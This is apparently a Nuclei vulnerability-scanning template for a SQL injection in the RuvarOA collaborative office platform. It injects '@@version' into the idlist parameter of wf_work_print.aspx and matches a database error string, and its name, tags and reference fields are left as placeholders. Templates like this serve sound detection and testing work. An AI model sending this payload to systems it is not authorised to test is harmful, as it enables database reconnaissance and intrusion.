id: RuvarOA-print-sqli
info:
  name: Template Name
  author: wangzong
  severity: high
  description: RuvarOA协同办公平台 多接口处存在SQL注入，恶意攻击者可能会利用此漏洞修改数据库中的数据，例如添加、删除或修改记录，导致数据损坏或丢失。
  reference:
    - https://
  tags: tags
http:
  - method: GET
    path:
      - "{{BaseURL}}/WorkFlow/wf_work_print.aspx?idlist=@@version"
    matchers:
      - type: word
        part: body
        words:
          - 'nvarchar'
